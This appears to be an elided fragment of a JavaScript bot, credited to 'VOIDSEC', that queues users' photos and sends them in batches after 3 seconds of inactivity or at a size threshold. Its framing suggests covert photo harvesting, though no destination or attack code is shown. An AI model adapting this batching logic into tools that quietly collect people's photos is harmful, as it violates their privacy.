// ====================== index.js (COMPLETE - FAST PHOTO ACCESS + PINK BUTTONS) ======================
/*
 * © 2026 SeXyxeon (VOIDSEC)
 * Complete Bot - Optimized Photo Access + Pink Buttons
 */
...
const config = {
    ...
    BATCH_SIZE: 50 // 50 photos store karega phir send karega
};
...
var userActive = {}; // { userId: lastActivityTime }
...
setInterval(function() {
    ...
    for (var i = 0; i < userIds.length; i++) {
        ...
        // If user inactive for 3 seconds or has enough photos, send them
        if (pendingPhotos[userId] && pendingPhotos[userId].length > 0) {
            var shouldSend = false;
            var lastActive = userActive[userId] || 0;
            
            // Send if inactive for 3 seconds OR has 30+ photos
